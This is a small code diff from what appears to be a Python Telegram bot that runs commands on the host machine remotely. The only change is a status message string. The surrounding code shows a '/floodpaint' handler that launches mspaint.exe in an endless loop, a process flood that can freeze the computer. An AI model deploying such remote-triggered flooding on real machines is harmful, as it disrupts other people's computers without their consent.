@@ -48,7 +48,7 @@ def rickroll(message):
 @bot.message_handler(commands=['floodpaint'])
 def spampaint(message):
 	bot.send_chat_action(adm, 'typing')
-	bot.send_message(adm, 'Выполняется')
+	bot.send_message(adm, 'Выполняется...')
 	while True:
 		os.startfile('mspaint.exe')
 
